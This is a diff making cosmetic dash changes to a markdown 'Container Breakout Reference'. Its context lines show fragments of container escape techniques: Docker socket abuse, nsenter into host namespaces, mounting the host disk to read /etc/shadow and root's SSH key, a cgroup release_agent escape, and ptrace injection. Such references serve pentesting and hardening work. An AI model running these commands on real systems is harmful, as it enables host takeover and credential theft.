@@ -1,6 +1,6 @@
 # Container Breakout Reference
 
-## Detection — Am I in a Container?
+## Detection - Am I in a Container?
 
 ```bash
 # Docker
@@ -23,7 +23,7 @@ hostname | grep -qP '^[a-f0-9]{12}$' && echo "Container-like hostname"
 
 ## Docker Socket Mount
 
-**Severity**: CRITICAL — full host compromise
+**Severity**: CRITICAL - full host compromise
 
 ```bash
 # Check
@@ -52,7 +52,7 @@ curl -s --unix-socket /var/run/docker.sock -X POST \
   http://localhost/containers/<ID>/exec
 ```
 
-## Privileged Container — nsenter
+## Privileged Container - nsenter
 
 ```bash
 # Check if privileged
@@ -62,7 +62,7 @@ ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link delete
 nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
 ```
 
-## Privileged Container — Mount Host Disk
+## Privileged Container - Mount Host Disk
 
 ```bash
 # Find host disk
@@ -78,7 +78,7 @@ cat /mnt/host/etc/shadow
 cat /mnt/host/root/.ssh/id_rsa
 ```
 
-## CAP_SYS_ADMIN — Cgroup Escape (notify_on_release)
+## CAP_SYS_ADMIN - Cgroup Escape (notify_on_release)
 
 ```bash
 # Works when container has CAP_SYS_ADMIN but is not fully privileged
@@ -107,7 +107,7 @@ sleep 1
 cat "$host_path/tmp/escape_shadow" 2>/dev/null || echo "Check /tmp/escape_shadow on host"
 ```
 
-## CAP_SYS_PTRACE — Process Injection
+## CAP_SYS_PTRACE - Process Injection
 
 ```bash
 # If container shares host PID namespace
@@ -126,7 +126,7 @@ import ctypes
 '
 ```
 
-## CAP_NET_ADMIN — Network Attacks
+## CAP_NET_ADMIN - Network Attacks
 
 ```bash
 # ARP spoof / packet capture from container
